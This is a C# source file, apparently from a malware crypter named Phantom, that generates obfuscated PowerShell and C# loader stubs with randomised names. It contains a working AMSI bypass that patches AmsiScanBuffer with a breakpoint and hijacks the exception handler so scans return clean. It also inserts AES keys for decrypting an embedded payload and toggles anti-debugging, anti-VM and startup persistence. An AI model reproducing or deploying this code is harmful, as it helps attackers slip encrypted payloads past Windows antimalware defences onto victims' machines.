using System;
using System.Collections.Generic;
using System.Text;

using static Phantom.Utils;

namespace Phantom
{
    internal class StubGen
    {
        private static string GetINT3Code(Random rng)
        {
            string className = RandomString(20, rng);
            string initMethod = RandomString(20, rng);
            string delField = RandomString(10, rng);
            string addrField = RandomString(10, rng);
            string origField = RandomString(10, rng);

            return $@"
$int3 = @'
using System;
using System.Runtime.InteropServices;
public class {className}
{{
    [DllImport(""kernel32.dll"")]
    static extern IntPtr GetModuleHandle(string n);
    [DllImport(""kernel32.dll"")]
    static extern IntPtr GetProcAddress(IntPtr h, string n);
    [DllImport(""kernel32.dll"")]
    static extern IntPtr AddVectoredExceptionHandler(uint f, IntPtr h);
    [DllImport(""kernel32.dll"")]
    static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
    const uint PAGE_EXECUTE_READWRITE = 0x40;
    const uint EXCEPTION_BREAKPOINT = 0x80000003;
    static IntPtr _{addrField};
    static byte _{origField};
    static {delField} _{delField};
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate uint {delField}(ref EXCEPTION_POINTERS ep);
    [StructLayout(LayoutKind.Sequential)]
    struct EXCEPTION_POINTERS
    {{
        public IntPtr ExceptionRecord;
        public IntPtr ContextRecord;
    }}
    static uint Handler(ref EXCEPTION_POINTERS ep)
    {{
        if (_{addrField} == IntPtr.Zero) return 0;
        uint code = (uint)Marshal.ReadInt32(ep.ExceptionRecord);
        if (code != EXCEPTION_BREAKPOINT) return 0;
        IntPtr ctx = ep.ContextRecord;
        long ip = Marshal.ReadInt64(ctx, 0xF8);
        if (ip != _{addrField}.ToInt64()) return 0;
        uint old;
        VirtualProtect(_{addrField}, (UIntPtr)1, PAGE_EXECUTE_READWRITE, out old);
        Marshal.WriteByte(_{addrField}, _{origField});
        VirtualProtect(_{addrField}, (UIntPtr)1, old, out old);
        long sp = Marshal.ReadInt64(ctx, 0x98);
        long rp = Marshal.ReadInt64((IntPtr)(sp + 0x30));
        if (rp != 0) Marshal.WriteInt32((IntPtr)rp, 0);
        long retAddr = Marshal.ReadInt64((IntPtr)sp);
        Marshal.WriteInt64(ctx, 0x78, 0);
        Marshal.WriteInt64(ctx, 0xF8, retAddr);
        Marshal.WriteInt64(ctx, 0x98, sp + 8);
        return unchecked((uint)-1);
    }}
    public static void {initMethod}()
    {{
        IntPtr h = GetModuleHandle(""amsi.dll"");
        if (h == IntPtr.Zero) return;
        IntPtr a = GetProcAddress(h, ""AmsiScanBuffer"");
        if (a == IntPtr.Zero) return;
        _{addrField} = a;
        uint old;
        VirtualProtect(a, (UIntPtr)1, PAGE_EXECUTE_READWRITE, out old);
        _{origField} = Marshal.ReadByte(a);
        Marshal.WriteByte(a, 0xCC);
        VirtualProtect(a, (UIntPtr)1, old, out old);
        _{delField} = new {delField}(Handler);
        AddVectoredExceptionHandler(1, Marshal.GetFunctionPointerForDelegate(_{delField}));
    }}
}}
'@;
Add-Type -TypeDefinition $int3;
[{className}]::{initMethod}();
";
        }

        internal static string CreatePS(byte[] key, byte[] iv, EncryptionMode mode, Random rng)
        {
            string stubcode = string.Empty;
            string decryptionKey = Convert.ToBase64String(key);
            string decryptionIV = Convert.ToBase64String(iv);
            string batPathVar = RandomString(5, rng);
            string contentsVar = RandomString(5, rng);
            string lastLineVar = RandomString(5, rng);
            string lineVar = RandomString(5, rng);
            string payloadVar = RandomString(5, rng);
            string msiVar = RandomString(5, rng);
            string msoVar = RandomString(5, rng);
            string gsVar = RandomString(5, rng);
            string obfStep1Var = RandomString(5, rng);
            string obfStep2Var = RandomString(5, rng);
            string obfTmpVar = RandomString(5, rng);

            stubcode += GetINT3Code(rng);
            stubcode += GetEmbeddedString(@"Phantom.Resources.AESStub.ps1");

            stubcode = stubcode.Replace(@"DECRYPTION_KEY", decryptionKey)
                               .Replace(@"DECRYPTION_IV", decryptionIV)
                               .Replace(@"batPath_var", batPathVar)
                               .Replace(@"contents_var", contentsVar)
                               .Replace(@"lastline_var", lastLineVar)
                               .Replace(@"line_var", lineVar)
                               .Replace(@"payload_var", payloadVar)
                               .Replace(@"msi_var", msiVar)
                               .Replace(@"mso_var", msoVar)
                               .Replace(@"gs_var", gsVar)
                               .Replace(@"obfstep1_var", obfStep1Var)
                               .Replace(@"obfstep2_var", obfStep2Var)
                               .Replace(@"obftmp_var", obfTmpVar);

            return stubcode;
        }

        // Method to create C# stub code
        internal static string CreateCS(byte[] key, byte[] iv, EncryptionMode mode, bool antidebug, bool antivm, bool startup, bool native, Random rng)
        {
            // Declare variables
            string namespacename = RandomString(20, rng);
            string classname = RandomString(20, rng);
            string aesfunction = RandomString(20, rng);
            string uncompressfunction = RandomString(20, rng);
            string gerfunction = RandomString(20, rng);

            // Encrypt predefined strings
            string key_str = Convert.ToBase64String(key);
            string iv_str = Convert.ToBase64String(iv);

            string stub = string.Empty;
            string stubcode = GetEmbeddedString(@"Phantom.Resources.Stub.cs");

            // Add compiler flags if specified
            if (antidebug)
            {
                stub += "#define ANTI_DEBUG\n";
            }
            if (antivm)
            {
                stub += "#define ANTI_VM\n";
            }
            if (startup)
            {
                stub += "#define STARTUP\n";
            }
            if (native)
            {
                stub += "#define NATIVE\n";
            }

            // Replace placeholders with generated values
            stubcode = stubcode.Replace(@"namespace_name", namespacename)
                               .Replace(@"class_name", classname)
                               .Replace(@"aesfunction_name", aesfunction)
                               .Replace(@"uncompressfunction_name", uncompressfunction)
                               .Replace(@"getembeddedresourcefunction_name", gerfunction)
                               .Replace(@"key_str", key_str)
                               .Replace(@"iv_str", iv_str);

            // Concatenate stub code with additional compiler flags if specified
            stub += stubcode;

            // Return the generated C# stub code
            return stub;
        }
    }
}